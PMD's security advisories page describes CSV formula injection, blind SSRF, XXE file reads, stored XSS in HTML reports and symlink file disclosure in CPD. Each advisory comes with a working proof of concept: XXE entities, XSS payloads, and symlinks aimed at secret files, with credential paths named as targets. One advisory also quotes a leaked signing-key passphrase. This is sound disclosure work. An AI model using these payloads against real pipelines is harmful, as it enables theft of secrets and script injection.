---
title: PMD Security
permalink: pmd_about_security.html
author: Andreas Dangel <andreas.dangel@pmd-code.org>
last_updated: October 2026 (7.29.0)
---

For reporting security issues, see [SECURITY.md](https://github.com/pmd/pmd/blob/main/SECURITY.md).

## Security Vulnerabilities
{% comment %}
Template:

### TODO GHSA / CVE Number
**Published:** YYYY-MM-DD

**CVE:** Requested / CVE-YYYY-NNNNNN

**Severity:** High/Medium(==Moderate)/Low

**Summary:**

**Versions Affected:**

**Description:**

**Details:**

**PoC:**

**Impact:**

**Fixes:**
* See [#PR TODO](https://github.com/pmd/pmd/pull/TODO) TODO

**Credits:**
* Reported by [Name](https://github.com/user) (@user)
* Independently reported by [Name](https://github.com/user) (@user)

**References:**
* [GHSA-TODO](https://github.com/pmd/pmd/security/advisories/GHSA-TODO) - Title
* [CVE-TODO](https://www.cve.org/CVERecord?id=CVE-TODO)
{% endcomment %}

### GHSA-jm8j-h474-h54h
**Published:** 2026-10-30

**CVE:** requested

**Severity:** Medium

**Summary:** Formula injection in CSV report format via unescaped quotes in file names

**Versions Affected:**
* pmd:pmd >= 1.2
* net.sourceforge.pmd:pmd-core <= 7.28.0

**Description:**

When PMD generates a CSV report, a crafted source filename can break out of the quoted file cell and inject a
spreadsheet formula. A user who opens the report in a spreadsheet application may have the formula evaluated.

**Details:**

* `CSVRenderer.allColumns` defines the columns and fills the File column using `determineFileName(rv.getFileId())`
  (CSVRenderer.java:51).
* `CSVWriter.quote` wraps a field in double quotes but does not escape embedded double quotes (CSVWriter.java:72-76).
* Neither class neutralizes values that begin with a formula trigger character (`=`, `+`, `-`, `@`).

A source filename containing a quote and comma can therefore terminate the File field and introduce a new field
beginning with `=`. The generated CSV contains a formula cell.

**Poc:**

Setup: PMD 7.28.0 binary distribution.

1.  Create a Java source file:
    ```
    cat > 'pfx",=1+1,".java' <<'EOF'
    class Trigger {
        void run() {
            try {
            } catch (Exception ignored) {
            }
        }
    }
    EOF
    ```

2.  Run PMD with the CSV renderer:
    ```
    pmd check \
      -d . \
      -R category/java/errorprone.xml \
      -f csv \
      -r report.csv \
      --no-cache
    ```

3.  Inspect the created report:
    ```
    "Problem","Package","File","Priority","Line","Description","Rule set","Rule"
    "1","","./pfx",=1+1,".java","3","4","Avoid catching Exception in try-catch block","Error Prone","AvoidCatchingGenericException"
    ```

A CSV parser reads `=1+1` as its own cell; the row has now 10 fields instead of 8.

**Impact:**

CWE-1236: Improper Neutralization of Formula Elements in a CSV File

An attacker who can contribute source files to a project analyzed by PMD can place a formula in the generated
CSV report. If a user opens the report in a spreadsheet application, the formula may be evaluated. This
reproduction demonstrates formula injection; it does not demonstrate data theft or code execution.

The other fields are affected as well: if the attacker controls the executed ruleset, a rule name,
ruleset name or rule message can inject a formula, either by the same quote breakout or simply by starting with `=`.

**Fixes:**
* See [#7262](https://github.com/pmd/pmd/issues/7262): \[core] Fix missing escaping in CSV renderers

**Credits:**
* Reported by [lapeace](https://github.com/ThejasRajamoney) (@ThejasRajamoney)
* Independently reported by [Hama1cco](https://github.com/Hama1cco) (@Hama1cco)

**References:**
* [GHSA-jm8j-h474-h54h](https://github.com/pmd/pmd/security/advisories/GHSA-jm8j-h474-h54h) - Formula injection in CSV report format via unescaped quotes in file names



### GHSA-wv72-2ccf-28gj
**Published:** 2026-10-30

**CVE:** requested

**Severity:** Medium

**Summary:** Blind SSRF through Visualforce metadata parser

**Versions Affected:**
* net.sourceforge.pmd:pmd-visualforce >= 6.30.0, <= 7.28.0

**Description:**

PMD’s Visualforce metadata parser reads Salesforce field metadata files to find out about custom field types.
These metadata files are XML files and PMD parses them without disabling external DTD loading, so it fetches
any external DTD a file references. A crafted metadata file can cause PMD to make a network request to an
attacker-chosen URL during analysis.

**Details:**

* `ObjectFieldTypes` creates a `javax.xml.parsers.DocumentBuilder` and disables external general and parameter
  entities, but does not disable external DTD loading (ObjectFieldTypes.java:105).
* `ObjectFieldTypes.parseSfdxCustomField` parses field metadata and uses XPath expressions to query it
  (ObjectFieldTypes.java:202).
* The Visualforce parser reaches this code path through `VfExpressionTypeVisitor` (VfExpressionTypeVisitor.java:142).
* The field metadata files are part of the analyzed source tree and are untrusted data.

**PoC:**

Setup: PMD 7.28.0 binary distribution. An SFDX project with a crafted `field-meta.xml` file.

1.  Create an empty file `probe.dtd`:
    ```
    touch probe.dtd
    ```

2.  Start a web server on 127.0.0.1:8000 in the directory containing `probe.dtd` in a second terminal:
    ```
    jwebserver -p 8000
    ```

3.  Create a small SFDX sample project to analyze:
    ```
    mkdir -p objects/Account/fields
    cat > objects/Account/fields/Hit__c.field-meta.xml <<'EOF'
    <!DOCTYPE CustomField SYSTEM 'http://127.0.0.1:8000/probe.dtd'>
    <CustomField>
      <fullName>Hit__c</fullName>
      <type>Text</type>
    </CustomField>
    EOF

    mkdir -p pages
    cat > pages/page.page <<'EOF'
    <apex:page standardController="Account">
      <apex:outputText value="{!Account.Hit__c}" escape="false"/>
    </apex:page>
    EOF
    ```

4.  Execute PMD:
    ```
    pmd check --no-progress --no-cache -d . -R category/visualforce/security.xml
    ```

5.  Observe the request in the web server log:
    ```
    127.0.0.1 - - [09/Oct/2026:15:31:38 +0200] "GET /probe.dtd HTTP/1.1" 200 -
    ```

This confirms blind external DTD network access.

**Expected:** PMD should not load the remote DTD.

**Actual:** PMD fetches the DTD over the network.

**Impact:**

CWE-827: Improper Control of Document Type Definition

CWE-918: Server-Side Request Forgery (SSRF)

This allows blind SSRF: an attacker can make PMD send requests to any URL reachable from the machine
running it. This affects users who use PMD to analyze Visualforce code from untrusted sources,
such as pull requests.

**Fixes:**
* See [#7261](https://github.com/pmd/pmd/pull/7261) \[core] Disallow external entity expansions/DTD in XML parsing

**Credits:**
* Reported by [lapeace](https://github.com/ThejasRajamoney) (@ThejasRajamoney)

**References:**
* [GHSA-wv72-2ccf-28gj](https://github.com/pmd/pmd/security/advisories/GHSA-wv72-2ccf-28gj) - Blind SSRF through Visualforce metadata parser



### GHSA-9hm5-r2r7-hjcq
**Published:** 2026-10-30

**CVE:** requested

**Severity:** Medium

**Summary:** Local file reads through XXE in PMD rule tests

**Versions Affected:**
* pmd:pmd >= 3.9
* net.sourceforge.pmd:pmd-test <= 6.47.0
* net.sourceforge.pmd:pmd-test-schema >= 6.48.0, <= 7.28.0

**Description:**

PMD provides a custom test framework for testing rules. The test cases are defined in an XML rule-tests file.
`pmd-test-schema` parses these rule-tests XML files with external entities enabled. A crafted XML rule-tests
file can cause the process running PMD rule tests to read a local file and place its contents in a parsed test
description. This was reproduced against PMD’s actual parser.

**Details:**

* `TestSchemaParser.newDocumentBuilder` creates a new `javax.xml.parsers.DocumentBuilder` with schema validation
  enabled, but it does not disable DTD parsing or external entities (TestSchemaParser.java:140-145).
* `TestSchemaParser.parse` passes that `DocumentBuilder` instance and the supplied `InputSource` to
  `OoxmlFacade.parse` (TestSchemaParser.java:81).
* `RuleTst.parseTestXml` loads the XML rule-tests through this parser (RuleTst.java:338-346).
* `RuleTst.toDynamicTest` uses the parsed test description as a JUnit dynamic test name (RuleTst.java:398-409).
* This test name will be in the JUnit reports, creating a possible route for file contents to appear in test results.

**PoC:**

1.  Create a file that should be read:
    ```
    mkdir LOCAL_FILE
    printf 'AWS_SECRET_ACCESS_KEY = wJalrXUtnFEMI...EXAMPLEKEY;\nDATABASE_PASSWORD = super_secret_prod_password_12345;\n' > LOCAL_FILE/secrets.txt
    ```

2.  Check out PMD (this would be done by CI):
    ```
    git clone --depth=1 --single-branch https://github.com/pmd/pmd.git
    ```

3.  Replace a rule-tests XML file with malicious content (this would be done in the PR):
    ```
    cat > pmd/pmd-apex/src/test/resources/net/sourceforge/pmd/lang/apex/rule/bestpractices/xml/ApexAssertionsShouldIncludeMessage.xml <<'EOF'
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE test-data [<!ENTITY leak SYSTEM '../../../LOCAL_FILE/secrets.txt'>]>
    <test-data
            xmlns="http://pmd.sourceforge.net/rule-tests"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://pmd.sourceforge.net/rule-tests http://pmd.sourceforge.net/rule-tests_1_0_0.xsd">
        <test-code>
            <description>&leak;</description>
            <expected-problems>1</expected-problems>
            <code>public class Foo {}</code>
        </test-code>

        <!-- some more text, so that the file is longer than the injected description of the test case above. -->
    </test-data>
    EOF
    ```

4.  Run the build with Maven:
    ```
    pmd/mvnw -f pmd/pom.xml -PfastSkip \
       -Dtest=ApexAssertionsShouldIncludeMessageTest \
       -Dsurefire.failIfNoSpecifiedTests=false \
      verify
    ```

5.  The test failure shows the content of the local file:
    ```
    [INFO] Running net.sourceforge.pmd.lang.apex.rule.bestpractices.ApexAssertionsShouldIncludeMessageTest
    --------------------------------------------------------------
    Test Failure: AWS_SECRET_ACCESS_KEY = wJalrXUtnFEMI...EXAMPLEKEY;
    DATABASE_PASSWORD = super_secret_prod_password_12345;
     -> Expected 1 problem(s), 0 problem(s) found.
     -> Expected messages: []
     -> Expected begin line numbers: []
    ```

Note: This can also be easily reproduced with the example project for custom rules at https://github.com/pmd/pmd-examples/tree/main/custom-rules/maven-java

**Expected:** The test case is not executed, as it contains a reference to an externally defined entity.

**Actual:** The test case is executed and reveals the content of a local file.

**Impact:**

CWE-611: Improper Restriction of XML External Entity Reference

This affects projects that use PMD's test framework and parse untrusted rule-tests XML files. This includes,
but is not limited to, PMD itself. Rule-testing jobs with access to files that the XML author cannot otherwise
read are particularly at risk. The PoC confirms that a local file can be read into a test description and
exfiltrated through the build logs. These logs are usually available through the CI output.

**Fixes:**
* See [#7261](https://github.com/pmd/pmd/pull/7261) \[core] Disallow external entity expansions/DTD in XML parsing

**Credits:**
* Reported by [lapeace](https://github.com/ThejasRajamoney) (@ThejasRajamoney)

**References:**
* [GHSA-9hm5-r2r7-hjcq](https://github.com/pmd/pmd/security/advisories/GHSA-9hm5-r2r7-hjcq) - Local file reads through XXE in PMD rule tests



### GHSA-5x5v-644m-q2qc
**Published:** 2026-10-30

**CVE:** requested

**Severity:** Moderate

**Summary:** XSS via externalInfoUrl in HTML report formats

**Versions Affected:**
* net.sourceforge.pmd:pmd-core 7.28.0 and earlier

**Description:**

PMD's `pmd-core` HTML renderers place attacker-controlled ruleset metadata into generated HTML
without context-appropriate escaping or URL-scheme validation. A crafted custom ruleset can inject executable
markup into a `summaryhtml` or `html` report when suppressed violations are rendered (`--show-suppressed`).
It can also put a `javascript:` URL in a normal HTML violation link, which executes if the report viewer clicks the link.

Exploitation requires PMD to load an attacker-controlled ruleset and a user to open the generated report.
The `javascript:` link variant additionally requires a click. The issue is in report generation, not PMD's ordinary
source analysis by itself.

**Details:**

The issue stems from two unsafe output paths in `HTMLRenderer`, which `SummaryHTMLRenderer` reuses, and from
missing validation in `RuleFactory`:

1.  `HTMLRenderer.renderRuleNameEscaped` escapes the rule name but concatenates `externalInfoUrl` directly
    into an HTML `href` attribute (HTMLRenderer.java:175). When suppressed warnings are rendered
    (with `--show-suppressed`), a quote in this attribute value can break out and inject markup.
2.  `HTMLRenderer.glomRuleViolations` parses `externalInfoUrl` with `URI.create` and inserts it into an `href`.
    URI parsing does not reject the `javascript:` scheme. A violation can therefore produce a JavaScript URL that
    runs when clicked.
3.  `SummaryHTMLRenderer.outputReport` delegates to `HTMLRenderer` for violations and suppressions, so it
    inherits both issues.
4.  `RuleFactory` accepts `externalInfoUrl` from ruleset XML without any validation or restrictions.

**PoC:**

These examples use only a harmless `alert()` call.

1.  Define a ruleset with crafted `externalInfoUrl` values and two test sources:
    ```
    cat > rs.xml <<'EOF'
    <?xml version="1.0" encoding="UTF-8"?>
    <ruleset name="PoC" xmlns="http://pmd.sourceforge.net/ruleset/2.0.0">
      <description>Local synthetic test</description>
      <rule name="AttrPoc" language="java"
            class="net.sourceforge.pmd.lang.rule.xpath.XPathRule"
            message="Synthetic violation"
            externalInfoUrl="&quot;&gt;&lt;img src=x onerror=&quot;alert('attribute')&quot;&gt;">
        <description>Local synthetic test rule</description>
        <priority>3</priority>
        <properties>
          <property name="xpath" value="//ClassDeclaration"/>
        </properties>
      </rule>

      <rule name="JsUriPoc" language="java"
            class="net.sourceforge.pmd.lang.rule.xpath.XPathRule"
            message="Synthetic violation"
            externalInfoUrl="javascript:alert('scheme')">
        <description>Local synthetic test rule</description>
        <priority>3</priority>
        <properties>
          <property name="xpath" value="//ClassDeclaration"/>
        </properties>
      </rule>
    </ruleset>
    EOF

    mkdir -p src
    echo 'class T {} // NOPMD' > src/T.java
    echo 'class U {}' > src/U.java
    ```

2.  Generate the reports:
    ```
    pmd check --no-progress --no-cache --show-suppressed \
      -d src/T.java -R rs.xml -f summaryhtml -r summary.html \
      --no-fail-on-violation

    pmd check --no-progress --no-cache --show-suppressed \
      -d src/T.java -R rs.xml -f html -r report.html \
      --no-fail-on-violation

    pmd check --no-progress --no-cache \
      -d src/U.java -R rs.xml/JsUriPoc -f html -r report-jsuri.html \
      --no-fail-on-violation
    ```

3.  Observe the issues:
   *   `summary.html` and `report.html` contain `<img src=x onerror="alert('attribute')">`. Opening the
       report in a browser runs the script.
   *   `summary.html` and `report.html` contain a link `<a href="javascript:alert('scheme')">JsUriPoc</a>`.
       Clicking the link runs the script.
   *   `report-jsuri.html` contains a link `<a href="javascript:alert('scheme')">Synthetic violation</a>`. 
       Clicking the link runs the script.


**Expected:** The `externalInfoUrl` is properly escaped when used in the `href` attribute of a link element,
and `javascript:` URLs are rejected or not rendered as links.

**Actual:** `HTMLRenderer` inserts `externalInfoUrl` unescaped, allowing attribute injection, and does not
block `javascript:` URLs, which execute when clicked.

**Impact:**

CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Stored XSS in the generated `summaryhtml` and `html` reports. When suppressed violations are rendered
(`--show-suppressed`), the injected script runs on load with no click. The `javascript:` URL variant affects
normal violations as well, but requires the viewer to click the link. This is relevant to workflows that
analyze untrusted contributions and make HTML reports available to reviewers (e.g., a published CI dashboard).
Script access is limited by the origin and browser policy under which the report is opened.

**Fixes:**
* See [#7260](https://github.com/pmd/pmd/pull/7260) \[core] HTMLRenderers: Properly escape rule name and externalInfoUrl

**Credits:**
* Reported by [lapeace](https://github.com/ThejasRajamoney) (@ThejasRajamoney)

**References:**
* [CVE-2026-28338](https://github.com/advisories/GHSA-8rr6-2qw5-pc7r) - Stored XSS in HTML renderers via unescaped violation messages
* [GHSA-x2h8-xxj6-pf6c](https://github.com/pmd/pmd/security/advisories/GHSA-x2h8-xxj6-pf6c) - XSS via rule name in summaryhtml report format
* [GHSA-5x5v-644m-q2qc](https://github.com/pmd/pmd/security/advisories/GHSA-5x5v-644m-q2qc) - XSS via externalInfoUrl in HTML report formats



### GHSA-x2h8-xxj6-pf6c
**Published:** 2026-10-30

**CVE:** requested

**Severity:** Moderate

**Summary:** XSS via rule name in summaryhtml report format

**Versions Affected:**
* net.sourceforge.pmd:pmd-core 7.28.0 and earlier

**Description:**

PMD's `summaryhtml` report format prints a summary table of rule names and their violation counts. The renderer writes
the rule name straight into the HTML with no escaping. A rule name that contains markup is emitted verbatim, so a
report opened in a browser executes the script. This is the same weakness class as [CVE-2026-28338](#CVE-2026-28338),
in a renderer and a field that the fix for that advisory did not touch. The main HTMLRenderer escapes the rule
name through `renderRuleNameEscaped`; SummaryHTMLRenderer does not.

The rule name comes from the ruleset. This reproduces when the ruleset used for analysis is attacker-influenced,
which is the CI case where the ruleset is checked out from an untrusted pull request, or any workflow that runs
a ruleset from an untrusted source.

**Details:**

-   `SummaryHTMLRenderer.renderSummary` builds each row with `writer.write(ruleName)` and no escaper
    (SummaryHTMLRenderer.java:66-68), where `ruleName` is `rv.getRule().getName()`.
-   Rule names are read verbatim from the ruleset XML by the rule factory with no character validation.
    XML entities in the `name` attribute decode to raw characters, so `name="&lt;script&gt;...&lt;/script&gt;"`
    becomes the literal `<script>...</script>`.
-   The CVE-2026-28338 fix (#6475) added escaping to VBHTMLRenderer, YAHTMLRenderer, and the HTMLRenderer
    suppressed-violation path. It did not add escaping to SummaryHTMLRenderer, so this sibling sink remained.

**PoC:**

Setup: PMD 7.27.0 binary distribution. A ruleset whose rule name carries the payload.

1.  Define a rule whose name is an XSS payload
    ```
    cat > rs.xml <<'EOF'
    <?xml version="1.0"?>
    <ruleset name="poc" xmlns="http://pmd.sourceforge.net/ruleset/2.0.0">
      <description>poc</description>
      <rule name="&lt;script&gt;alert(document.domain)&lt;/script&gt;"
            language="java" message="hit"
            class="net.sourceforge.pmd.lang.rule.xpath.XPathRule">
        <properties><property name="xpath"><value>//ClassDeclaration</value></property></properties>
      </rule>
    </ruleset>
    EOF
    mkdir -p src && echo 'public class A { void m() {} }' > src/A.java
    ```

2.  Generate the summaryhtml report
    ```
    pmd check -d src -R rs.xml -f summaryhtml --no-cache
    ```

3.  Read the emitted HTML
    ```
    <tr><td><script>alert(document.domain)</script></td><td align=center>1</td></tr>
    ```

The rule name is written into the table cell unescaped. Opening the report in a browser runs the script.

**Expected:** the rule name is HTML-escaped before being written into the report, the same way HTMLRenderer escapes it.
**Actual:** SummaryHTMLRenderer writes the rule name raw, so markup in the name executes.

**Impact:**

Stored XSS in the generated `summaryhtml` report. The script runs in the browser of whoever opens the report,
which in CI is a developer or reviewer reading the analysis output. It runs on load with no click. Where the report
is served from a domain (a published CI dashboard, an internal report host), the script runs in that origin and can
act with the viewer's session there.

**Fixes:**
* See [#7260](https://github.com/pmd/pmd/pull/7260) \[core] HTMLRenderers: Properly escape rule name and externalInfoUrl

**Credits:**
* Reported by [Dan](https://github.com/7alen7) (@7alen7)
* Independently reported by [lapeace](https://github.com/ThejasRajamoney) (@ThejasRajamoney)

**References:**
* [GHSA-x2h8-xxj6-pf6c](https://github.com/pmd/pmd/security/advisories/GHSA-x2h8-xxj6-pf6c) - XSS via rule name in summaryhtml report format



### GHSA-wj6q-xw9m-26p6
**Published:** 2026-10-30

**CVE:** requested

**Severity:** Medium

**Summary:** Arbitrary file disclosure in CPD via symlinks in analyzed sources

**Versions Affected:**
* net.sourceforge.pmd:pmd-core 7.28.0 and earlier, starting with 6.54.0

**Description:**

CPD is the copy-paste detector shipped with PMD. It walks a directory of source files, tokenizes them, and reports
duplicated regions along with the duplicated source text. The directory walk follows symbolic links, and the file
reader applies no check that a resolved file stays inside the scanned tree. An attacker who controls the files in a
scanned project (a pull request analyzed in CI, a delivered source package under assurance review) commits two symlinks
that point at the same file outside the project. CPD reads the link target, detects the two copies as a 100%
duplication, and writes the target file's full contents into the report. When the report is published as a CI artifact
the attacker reads it back.

**Details:**

-   File collection walks directories with symlink following enabled:
    `Files.walkFileTree(dir, EnumSet.of(FileVisitOption.FOLLOW_LINKS), maxDepth, ...)`
    in `FileCollector.addDirectory`` (FileCollector.java:281).
-   The visitor adds any resolved regular file with no containment check. `addFile` only tests `Files.isRegularFile`,
    which itself follows the link, so a link to `/etc/passwd` is accepted as a source file.
-   CPD's renderers write the duplicated source verbatim. `SimpleRenderer.renderOn` calls
    `report.getSourceCodeSlice(...)` and `source.writeFully(writer)` (SimpleRenderer.java).
    The XML and Markdown CPD renderers do the same through a CDATA / fenced block.
-   Two links to one target guarantee a full-length duplication, so the entire target file is emitted rather than a
    fragment.

**PoC:**

Setup: PMD 7.27.0 binary distribution (pmd-dist-7.27.0-bin.zip). No account or privilege needed. The attacker only
needs to place files in a directory that CPD is later run against, which is the normal position of a PR author or a
package submitter.

1.  Stage a secret outside the project and two symlinks inside it
    ```shell
    mkdir -p project OUTSIDE_THE_REPO
    printf 'AWS_SECRET_ACCESS_KEY = wJalrXUtnFEMI...EXAMPLEKEY ;\nDATABASE_PASSWORD = super_secret_prod_password_12345 ;\nGITHUB_TOKEN = ghp_fake_token_for_poc_000 ;\nSTRIPE_KEY = sk_live_fake_key_for_poc_000 ;\nMORE = padding to exceed the token threshold ;\n' > OUTSIDE_THE_REPO/ci_secret.env
    ln -s ../OUTSIDE_THE_REPO/ci_secret.env project/copy_a.java
    ln -s ../OUTSIDE_THE_REPO/ci_secret.env project/copy_b.java
    ```
    The project directory contains only two symlinks. The secret lives outside it.

2.  Run CPD the way a CI job does
    ```shell
    pmd cpd --minimum-tokens 10 --language java --dir project --format text
    ```

3.  Read the target file's contents back out of the report
    ```
    Found a 5 line (15 tokens) duplication in the following files:
    Starting at line 1 of .../project/copy_a.java
    Starting at line 1 of .../project/copy_b.java
    
    AWS_SECRET_ACCESS_KEY = wJalrXUtnFEMI...EXAMPLEKEY ;
    DATABASE_PASSWORD = super_secret_prod_password_12345 ;
    GITHUB_TOKEN = ghp_fake_token_for_poc_000 ;
    STRIPE_KEY = sk_live_fake_key_for_poc_000 ;
    MORE = padding to exceed the token threshold ;
    ```
    
    The contents of `OUTSIDE_THE_REPO/ci_secret.env`, a file that was never inside the scanned directory, appear verbatim
    in the report.

**Expected:** CPD analyzes files within the directory it is given and does not read or disclose files outside it based
on symlinks committed by the analyzed project.

**Actual:** CPD follows committed symlinks out of the tree, reads the target, and writes its contents into the report.

**Impact:**

The core primitive is an arbitrary local-file read on the machine running CPD, driven entirely by files an untrusted
party placed in the scanned project, with the file contents exfiltrated through the report artifact.

Demonstrated:

1.   Read of a file outside the scanned tree. The target contents appear in the default text report.
2.   Exfiltration channel. CI pipelines routinely publish the CPD report as a build artifact or PR comment, which
     returns the leaked contents to the PR author.
3.   Reach. Any absolute path the runner user can read is a valid target: `/etc/passwd`, `~/.aws/credentials`,
     `~/.ssh/id_*`, the CI token file, `.git-credentials`, or the checkout of an adjacent private repository on the
     same runner.

This is the assurance/CI threat model: the author of the scanned source is a separate, unprivileged principal from
the runner that holds the secrets. Scanning untrusted source is the intended use of the tool.

**Fixes:**
*   See [#7259](https://github.com/pmd/pmd/pull/7259) \[core] Don't follow symlinks in FileCollector

**Credits:**
*   Reported by [Dan](https://github.com/7alen7) (@7alen7).
*   Independently reported by [lapeace](https://github.com/ThejasRajamoney) (@ThejasRajamoney).

**References:**
*   [GHSA-wj6q-xw9m-26p6](https://github.com/pmd/pmd/security/advisories/GHSA-wj6q-xw9m-26p6) - Arbitrary file disclosure in CPD via symlinks in analyzed sources



### CVE-2026-28338
**Published:** 2026-02-27

**Severity:** Medium

**Summary:** Stored XSS in HTML renderers via unescaped violation messages

**Versions Affected:**
* net.sourceforge.pmd:pmd-core 7.21.0 and earlier

**Description:**

PMD's `vbhtml` and `yahtml` report formats insert rule violation messages into HTML output without escaping.
When PMD analyzes untrusted source code containing crafted string literals, the generated HTML report contains
executable JavaScript that runs when opened in a browser.

While the default `html` format is not affected via rule violation messages (it correctly uses
`StringEscapeUtils.escapeHtml4()`), it has a similar problem when rendering suppressed violations.
The user supplied message (the reason for the suppression) was not escaped.

**Details:**

`VBHTMLRenderer.java` line 71 appends `rv.getDescription()` directly into HTML:

```java
sb.append("<td><font class=body>").append(rv.getDescription()).append("</font></td>");
```

`YAHTMLRenderer.java` lines 196–203 does the same via `renderViolationRow()`:

```java
private String renderViolationRow(String name, String value) {
    return "<tr><td><b>" + name + "</b></td>" + "<td>" + value + "</td></tr>";
}
```

Called at line 172:

```java
out.print(renderViolationRow("Description:", violation.getDescription()));
```

The violation message originates from `AvoidDuplicateLiteralsRule.java` line 91, which embeds raw string literal
values via `first.toPrintableString()`. This calls `StringUtil.escapeJava()` (line 476–480), which is a Java source
escaper — it passes `<`, `>`, and `&` through unchanged because they are printable ASCII (0x20–0x7e).

By contrast, `HTMLRenderer.java` line 143 properly escapes:

```java
String d = StringEscapeUtils.escapeHtml4(rv.getDescription());
```

**PoC:**

1. Create a Java file with 4+ duplicate string literals containing an HTML payload:

```java
public class Exploit {
    String a = "<img src=x onerror=alert(document.domain)>";
    String b = "<img src=x onerror=alert(document.domain)>";
    String c = "<img src=x onerror=alert(document.domain)>";
    String d = "<img src=x onerror=alert(document.domain)>";
}
```

2. Run PMD with the `vbhtml` format:

```bash
pmd check -R category/java/errorprone.xml -f vbhtml -d Exploit.java -r report.html
```

3. Open `report.html` in a browser. A JavaScript alert executes showing `document.domain`.

The generated HTML contains the unescaped tag:

```html
<td><font class=body>The String literal "<img src=x onerror=alert(document.domain)>" appears 4 times in this file</font></td>
```

Tested and confirmed on PMD 7.22.0-SNAPSHOT (commit bcc646c53d).

**Impact:**
Stored cross-site scripting (XSS). Affects CI/CD pipelines that run PMD with `--format vbhtml` or `--format yahtml`
on untrusted source code (e.g., pull requests from external contributors) and expose the HTML report as a build
artifact. JavaScript executes in the browser context of anyone who opens the report.

Practical impact is limited because `vbhtml` and `yahtml` are legacy formats rarely used in practice.
The default `html` format has a similar issue with user messages from suppressed violations.

**Fixes:**
* See [#6475](https://github.com/pmd/pmd/issues/6475): \[core] Fix stored XSS in VBHTMLRenderer and YAHTMLRenderer

**Credits:**
* Reported by [Smaran Chand](https://github.com/smaranchand) (@smaranchand)

**References:**
* [GHSA-8rr6-2qw5-pc7r](https://github.com/pmd/pmd/security/advisories/GHSA-8rr6-2qw5-pc7r) - Stored XSS in HTML renderers via unescaped violation messages
* [CVE-2026-28338](https://www.cve.org/CVERecord?id=CVE-2026-28338)

### CVE-2025-23215
**Published:** 2025-01-31

**Severity:** Low

**Summary:** Release key passphrase (GPG) available on Maven Central in cleartext

**Versions Affected:**

* net.sourceforge.pmd:pmd-core 7.9.0 and earlier
* net.sourceforge.pmd:pmd-designer 7.9.0 and earlier
* net.sourceforge.pmd:pmd-ui 7.0.0-rc4 and earlier
* net.sourceforge.pmd.eclipse.plugin 7.9.0.v20241227-1626-r

**Description:**

While rebuilding [PMD Designer](https://github.com/pmd/pmd-designer) for Reproducible Builds and digging into issues,
I found out that passphrase for `gpg.keyname=0xD0BF1D737C9A1C22` is included in jar published to Maven Central.

**Details:**

See https://github.com/jvm-repo-rebuild/reproducible-central/blob/master/content/net/sourceforge/pmd/pmd-designer/README.md

I removed 2 lines from https://github.com/jvm-repo-rebuild/reproducible-central/blob/master/content/net/sourceforge/pmd/pmd-designer/pmd-designer-7.0.0.diffoscope
but real content is:

```
├── net/sourceforge/pmd/util/fxdesigner/designer.properties
│ @@ -1,14 +1,12 @@
│  #Properties
│  checkstyle.plugin.version=3.3.1
│  checkstyle.version=10.14.0
│ -gpg.keyname=0xD0BF1D737C9A1C22
│ -gpg.passphrase=evicx0nuPfvSVhVyeXpw
│  jar.plugin.version=3.3.0
│ -java.version=11.0.22
│ +java.version=11.0.25
│  javadoc.plugin.version=3.6.3
│  jflex-output=/home/runner/work/pmd-designer/pmd-designer/target/generated-sources/jflex
│  junit5.version=5.8.2
│  kotest.version=5.5.5
│  kotlin.version=1.7.20
│  local.lib.repo=/home/runner/work/pmd-designer/pmd-designer/lib/mvn-repo
│  openjfx.scope=provided
```

**PoC:**
```
./rebuild.sh content/net/sourceforge/pmd/pmd-designer/pmd-designer-7.0.0.buildspec
```

**Impact**

After further analysis, the passphrase of the following two keys have been compromised:

1. `94A5 2756 9CAF 7A47 AFCA  BDE4 86D3 7ECA 8C2E 4C5B`: PMD Designer (Release Signing Key) <releases@pmd-code.org>
   This key has been used since 2019 with the release of [net.sourceforge.pmd:pmd-ui:6.14.0](https://repo.maven.apache.org/maven2/net/sourceforge/pmd/pmd-ui/6.14.0/).
   The following versions are signed with the same key: 6.16.0, 6.17.0, 6.19.0.
2. `EBB2 41A5 45CB 17C8 7FAC  B2EB D0BF 1D73 7C9A 1C22`: PMD Release Signing Key <releases@pmd-code.org>
   This key has been used since 2020 with the release of [net.sourceforge.pmd:pmd-ui:6.21.0](https://repo.maven.apache.org/maven2/net/sourceforge/pmd/pmd-ui/6.21.0/)
   and all the other modules of PMD such as [net.sourceforge.pmd:pmd-core:6.21.0](https://repo.maven.apache.org/maven2/net/sourceforge/pmd/pmd-core/6.21.0/).  
   This key has also been used for PMD 7, for the designer, e.g. [net.sourceforge.pmd:pmd-designer:7.0.0](https://repo.maven.apache.org/maven2/net/sourceforge/pmd/pmd-designer/7.0.0/)
   and [net.sourceforge.pmd:pmd-core:7.0.0](https://repo.maven.apache.org/maven2/net/sourceforge/pmd/pmd-core/7.0.0/).
   The versions between 6.21.0 and 7.9.0 are signed with this key.  
   Additionally the key has been used to sign the last release of [PMD Eclipse Plugin 7.9.0.v20241227-1626-r](https://github.com/pmd/pmd-eclipse-plugin/releases/tag/7.9.0.v20241227-1626-r).

The keys have been used exclusively for signing artifacts that we published to Maven Central under group
id `net.sourceforge.pmd` and once for our pmd-eclipse-plugin. The private key itself is not known to have
been compromised itself, but given its passphrase is, it must also be considered potentially compromised.

As a mitigation, both compromised keys have been revoked so that no future use of the keys are possible.
For future releases of PMD, PMD Designer and PMD Eclipse Plugin we use a new release signing key:
`2EFA 55D0 785C 31F9 56F2  F87E A0B5 CA1A 4E08 6838` (PMD Release Signing Key <releases@pmd-code.org>).

Note, that the published artifacts in Maven Central under the group id `net.sourceforge.pmd` are **not**
compromised and the signatures are valid. No other past usages of the private key is known to the project
and no future use is possible due to the revocation. If anybody finds a past abuse of the private key,
please share with us.

Note, the module `net.sourceforge.pmd:pmd-ui` has been renamed to `net.sourceforge.pmd:pmd-designer` since PMD 7,
so there won't be a fixed version for `pmd-ui`.

**Fixes:**
* Reworked build script in PMD Designer to not include all system properties
    * https://github.com/pmd/pmd-designer/commit/1548f5f27ba2981b890827fecbd0612fa70a0362
    * https://github.com/pmd/pmd-designer/commit/e87a45312753ec46b3e5576c6f6ac1f7de2f5891

**Credits:**
* Reported by [Hervé Boutemy](https://github.com/hboutemy) (@hboutemy)

**References:**
* [GHSA-88m4-h43f-wx84](https://github.com/pmd/pmd/security/advisories/GHSA-88m4-h43f-wx84) - Release key passphrase (GPG) available on Maven Central in cleartext
* [CVE-2025-23215](https://www.cve.org/CVERecord?id=CVE-2025-23215)
